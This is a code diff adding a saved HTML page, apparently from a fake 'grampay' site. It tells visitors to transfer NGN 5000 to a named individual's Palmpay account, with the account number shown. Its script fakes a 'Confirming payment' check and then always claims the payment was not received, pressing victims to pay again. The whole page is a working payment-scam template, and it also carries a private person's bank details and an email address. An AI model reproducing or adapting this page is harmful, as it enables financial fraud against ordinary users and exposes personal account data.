@@ -1,0 +1,143 @@
+
+<!-- saved from url=(0047)https://allappsreveiws.com.ng/grampay/acc.html? -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></head><body>U Beol
+
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+
+
+    <style>
+        * {
+            padding: 0;
+            margin: 0; 
+        }
+        body {
+            background: #f6f6f6;
+        }
+        .top {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            height:70px;
+            background-color:#7a57d1;
+        }
+        .top img {
+            width: 50px;
+            padding-left: 17px;
+            padding-top: 9px;
+        }
+        .box {
+            margin-top: 20% ;
+            text-align: center;
+        }
+
+        .body {
+            /* margin-top: 70% ; */
+           width: 90%;
+           height: 240px;
+           border-radius: 10px;
+           background: #ffffff;
+           margin: 0 auto;
+           box-shadow: 3px 9px 9px  grey;
+        }
+        button {
+            width: 70%;
+            height: 37px;
+            margin: 0 auto ;
+            display: block;
+            color: white;
+            border: none;
+            background: #7a57d1;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            position: relative;
+        }
+        .spinner {
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+   <div class="top">
+    <img src="./payment1_files/saved_resource" alt="">
+   </div>  <br> <br>
+
+   
+
+  <div class="box">
+    <h2>Tranfer NGN 5000 To this chechout</h2>
+  </div> <br> <br> <br>
+
+  <div class="body"> <br>
+        <p style="padding-left: 10px;">Bank Name</p>
+        <h2 style="padding-left: 10px;">Palmpay </h2> <br> 
+
+        <p style="padding-left: 10px;">Account Name</p>
+        <h2 style="padding-left: 10px;">Shebalom Ruth Wuyep
+
+       </h2> <br> 
+
+         <p style="padding-left: 10px;">Account Number</p>
+         <h2 style="padding-left: 10px;">7078526330 </h2> <br> 
+
+  </div> <br>
+   <h3 style="text-align: center;">Use this account to make the transaction</h3> <br>
+
+   <button>I've sent the money</button>
+   <div class="modal" id="modal">
+    <div class="modal-content">
+        <div id="spinner" class="spinner">📸</div>
+        <p id="modal-text">Confirming payment</p>
+       <p id="success-text" style="display: none;">Payment not received Pay now, need help? <a href="mailto:grampay2024@gmail.com">Send email</a></p> <br>
+        <button id="close-button" style="display: none;"><a href="https://allappsreveiws.com.ng/grampay/acc.html?" style="text-decoration: none;">close</a></button>
+    </div>
+</div>
+   <script>
+    const modal = document.getElementById('modal');
+    const spinner = document.getElementById('spinner');
+    const modalText = document.getElementById('modal-text');
+    const successText = document.getElementById('success-text');
+    const closeButton = document.getElementById('close-button');
+
+    const button = document.querySelector('button');
+    button.addEventListener('click', () => {
+        modal.style.display = 'flex';
+        spinner.style.display = 'block';
+        modalText.textContent = 'Confirming payment';
+        setTimeout(() => {
+            spinner.style.display = 'none';
+            modalText.style.display = 'none';
+            successText.style.display = 'block';
+            closeButton.style.display = 'block';
+        }, 13000);
+    });
+
+    closeButton.addEventListener('click', () => {
+        modal.style.display = 'none';
+    });
+</script>
+
+
+
+
+
+</body></html>
